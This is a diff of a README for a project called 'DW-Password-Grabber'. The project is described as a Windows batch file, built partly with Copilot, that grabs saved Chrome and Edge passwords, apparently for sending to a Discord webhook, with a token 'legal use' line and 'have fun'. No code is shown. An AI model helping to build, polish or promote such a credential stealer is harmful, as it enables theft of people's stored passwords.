@@ -1,5 +1,2 @@
 # DW-Password-Grabber
-DW means Discord Webhook
-The Decoder & in a windows bat file that was made my me and a little help of copilot can grab chrome and edge passwords (There Encrypted working on a automatic decrypter) 
-Please use with legal use
-But have fun
+DW stands for Discord Webhook. This is a Windows batch file, created with my assistance and a little help from Copilot, that can retrieve Chrome and Edge passwords (which are currently encrypted; I'm working on an automatic decryption tool). Please use it responsibly and for legal purposes only, but have fun!
